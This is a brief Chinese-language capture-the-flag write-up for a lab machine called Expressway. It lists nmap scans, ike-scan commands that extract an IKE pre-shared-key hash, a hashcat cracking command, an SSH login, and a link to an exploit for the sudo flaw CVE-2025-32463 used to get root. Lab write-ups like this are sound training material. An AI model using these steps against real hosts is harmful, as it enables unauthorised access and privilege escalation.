---
title: Expressway
weight: -736
tags:
  - linux
  - easy
  - ike-scan
  - cve-2025-32463
---

![expressway_rank.png](expressway_rank.png)

## 00. 摘要

> 关键词：UDP Scan、IKE Scan、CVE-2025-32463

1. 端口扫描


端口扫描：

```bash
# 发现 22 端口
nmap 10.129.238.52

# 发现 500 端口
nmap -sU 10.129.238.52
```

入口：

```bash
# 信息探测
sudo ike-scan -M 10.129.238.52

# 获取 hash
sudo ike-scan -P -M -A -n fakeID 10.129.238.52

# 爆破 hash
hashcat -m 5400 hash.txt /usr/share/wordlists/rockyou.txt
```

爆破出密码，然后ssh登录

信息收集，`sudo -V` 发现 sudo 版本是 1.9.17

网上搜索，发现可以用 [CVE-2025-32463](https://www.exploit-db.com/exploits/52352) 提权 


